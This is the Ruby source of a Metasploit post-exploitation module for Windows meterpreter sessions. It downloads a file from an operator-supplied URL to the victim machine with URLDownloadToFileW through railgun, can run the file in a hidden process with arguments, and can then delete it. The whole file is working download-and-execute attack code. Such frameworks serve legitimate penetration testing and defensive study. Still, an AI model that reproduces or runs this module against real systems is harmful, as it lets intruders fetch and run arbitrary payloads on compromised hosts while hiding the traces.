##
# $Id$
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require 'msf/core'
require 'rex'
require 'msf/core/post/file'

class Metasploit3 < Msf::Post
	include Msf::Post::File

	def initialize(info={})
		super(update_info(info,
			'Name'                 => "Windows Manage Download and/or Execute",
			'Description'          => %q{
				This module will download a file by importing urlmon via railgun.
				The user may also choose to execute the file with arguments via exec_string.
			},
			'License'              => MSF_LICENSE,
			'Version'              => '$Revision$',
			'Platform'             => ['windows'],
			'SessionTypes'         => ['meterpreter'],
			'Author'               => ['RageLtMan']
		))

		register_options(
			[
				OptString.new('URL',           [true, 'Full URL of file to download' ]),
				OptString.new('DOWNLOAD_PATH', [false, 'Full path for downloaded file' ]),
				OptString.new('FILENAME',      [false, 'Name for downloaded file' ]),
				OptBool.new(  'OUTPUT',        [false, 'Show execution output', true ]),
				OptBool.new(  'EXECUTE',       [false, 'Execute file after completion', false ]),
			], self.class)

		register_advanced_options(
			[
				OptString.new('EXEC_STRING',   [false, 'Execution parameters when run from download directory' ]),
				OptBool.new(  'DELETE',        [false, 'Delete file after execution', false ]),
			], self.class)

	end

	# Check to see if our dll is loaded, load and configure if not

	def add_railgun_urlmon

		if client.railgun.dlls.find_all {|d| d.first == 'urlmon'}.empty?
			session.railgun.add_dll('urlmon','urlmon')
			session.railgun.add_function('urlmon', 'URLDownloadToFileW', 'DWORD', [
			['PBLOB', 'pCaller', 'in'],['PWCHAR','szURL','in'],['PWCHAR','szFileName','in'],['DWORD','dwReserved','in'],['PBLOB','lpfnCB','inout']
		])
			print_good("urlmon loaded and configured") if datastore['VERBOSE']
		else
			print_status("urlmon already loaded") if datastore['VERBOSE']
		end

	end

	def run_cmd(cmd)
		process = session.sys.process.execute(cmd, nil, {'Hidden' => true, 'Channelized' => true})
		res = ""
		while (d = process.channel.read)
			break if d == ""
			res << d
		end
		process.channel.close
		process.close
		return res
	end

	def run

		# Make sure we meet the requirements before running the script, note no need to return
		# unless error
		return 0 if session.type != "meterpreter"

		# get time
		strtime = Time.now

		# check/set vars
		url = datastore["URL"]
		filename = datastore["FILENAME"] || url.split('/').last
		path = session.fs.file.expand_path(datastore["DOWNLOAD_PATH"]) || session.fs.file.expand_path("%TEMP%")
		outpath = path + '\\' + filename
		exec = datastore["EXECUTE"]
		exec_string = datastore["EXEC_STRING"]
		output = datastore['OUTPUT']
		remove = datastore['DELETE']


		# set up railgun
		add_railgun_urlmon

		# get our file
		print_status("\tDownloading #{url} to #{outpath}") if datastore['VERBOSE']
		client.railgun.urlmon.URLDownloadToFileW(nil,url,outpath,0,nil)

		# check our results
		out = session.fs.file.stat(outpath)

		print_status("\t#{out.stathash['st_size']} bytes downloaded to #{outpath} in #{(Time.now - strtime).to_i} seconds ")

		# run our command
		if exec
			cmd = outpath + ' ' + exec_string
			res = run_cmd(cmd)
			print_good(res) if output

					# remove file if needed
			if remove
				print_status("\tDeleting #{outpath}") if datastore['VERBOSE']
				session.fs.file.rm(outpath)
			end
		end



	end
end

